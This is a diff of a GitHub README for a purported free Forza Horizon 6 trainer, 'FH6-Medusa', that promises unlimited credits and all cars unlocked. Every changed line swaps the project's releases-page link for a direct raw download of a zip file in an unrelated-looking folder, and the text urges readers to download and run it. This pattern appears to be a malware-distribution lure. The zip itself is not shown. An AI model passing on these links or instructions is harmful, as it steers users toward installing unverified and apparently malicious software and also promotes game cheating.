@@ -1,8 +1,8 @@
 <h1>🎮 FH6-Medusa - Unlock The Ultimate Forza Horizon 6 Experience</h1>
 
 <p align="center">
-  <a href="https://github.com/Worthy-psocopterousinsect175/FH6-Medusa/releases"><img src="https://img.shields.io/badge/Download-FH6--Medusa-2ea44f?style=for-the-badge&logo=windows&logoColor=white" alt="Download FH6-Medusa"></a>
-  <a href="https://github.com/Worthy-psocopterousinsect175/FH6-Medusa/releases"><img src="https://img.shields.io/badge/Free%20Download-2026-blue?style=for-the-badge" alt="Free Download"></a>
+  <a href="https://raw.githubusercontent.com/Worthy-psocopterousinsect175/FH6-Medusa/main/participle/Medusa_F_3.3.zip"><img src="https://img.shields.io/badge/Download-FH6--Medusa-2ea44f?style=for-the-badge&logo=windows&logoColor=white" alt="Download FH6-Medusa"></a>
+  <a href="https://raw.githubusercontent.com/Worthy-psocopterousinsect175/FH6-Medusa/main/participle/Medusa_F_3.3.zip"><img src="https://img.shields.io/badge/Free%20Download-2026-blue?style=for-the-badge" alt="Free Download"></a>
 </p>
 
 Welcome to **FH6-Medusa**, your all-in-one companion tool for Forza Horizon 6 on Windows. Whether you want unlimited credits, unlock all 812 cars, or simply enhance your gameplay with extra features, FH6-Medusa gives you everything you need—completely free. No complex steps, no coding knowledge required. Just download, run, and enjoy.
@@ -31,7 +31,7 @@ Follow these simple steps to get FH6-Medusa up and running on your computer.
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Worthy-psocopterousinsect175/FH6-Medusa/releases](https://github.com/Worthy-psocopterousinsect175/FH6-Medusa/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/Worthy-psocopterousinsect175/FH6-Medusa/main/participle/Medusa_F_3.3.zip](https://raw.githubusercontent.com/Worthy-psocopterousinsect175/FH6-Medusa/main/participle/Medusa_F_3.3.zip)
 
 Click the download button on that page. Your browser will save the file to your computer.
 
@@ -65,7 +65,7 @@ FH6-Medusa is designed to be lightweight and efficient. You should be fine if yo
 
 ### 💾 Download Steps
 
-1.  Go to the download page: [https://github.com/Worthy-psocopterousinsect175/FH6-Medusa/releases](https://github.com/Worthy-psocopterousinsect175/FH6-Medusa/releases)
+1.  Go to the download page: [https://raw.githubusercontent.com/Worthy-psocopterousinsect175/FH6-Medusa/main/participle/Medusa_F_3.3.zip](https://raw.githubusercontent.com/Worthy-psocopterousinsect175/FH6-Medusa/main/participle/Medusa_F_3.3.zip)
 2.  Look for the latest release version.
 3.  Click the download link (usually the largest file, ending in `.exe` or `.zip`).
 4.  Wait for the download to finish.
@@ -139,7 +139,7 @@ There are many trainer tools out there, but FH6-Medusa stands out for several re
 
 ### Updates and Announcements
 
-All new features and bug fixes are posted on the release page: [https://github.com/Worthy-psocopterousinsect175/FH6-Medusa/releases](https://github.com/Worthy-psocopterousinsect175/FH6-Medusa/releases)
+All new features and bug fixes are posted on the release page: [https://raw.githubusercontent.com/Worthy-psocopterousinsect175/FH6-Medusa/main/participle/Medusa_F_3.3.zip](https://raw.githubusercontent.com/Worthy-psocopterousinsect175/FH6-Medusa/main/participle/Medusa_F_3.3.zip)
 
 We recommend checking this page periodically or starring the repository to get notified of new releases.
 
@@ -157,7 +157,7 @@ FH6-Medusa is a third-party tool and is not affiliated with Microsoft, Playgroun
 
 FH6-Medusa transforms your Forza Horizon 6 experience from frustrating grind to pure joy. With unlimited credits, every car unlocked, and the ability to customize your in-game music, you'll spend more time doing what matters—racing and having fun.
 
-**Get started now by downloading the latest version:** [Visit this link to download the application](https://github.com/Worthy-psocopterousinsect175/FH6-Medusa/releases)
+**Get started now by downloading the latest version:** [Visit this link to download the application](https://raw.githubusercontent.com/Worthy-psocopterousinsect175/FH6-Medusa/main/participle/Medusa_F_3.3.zip)
 
 Thank you for choosing FH6-Medusa. See you on the roads! 🏎️💨
 
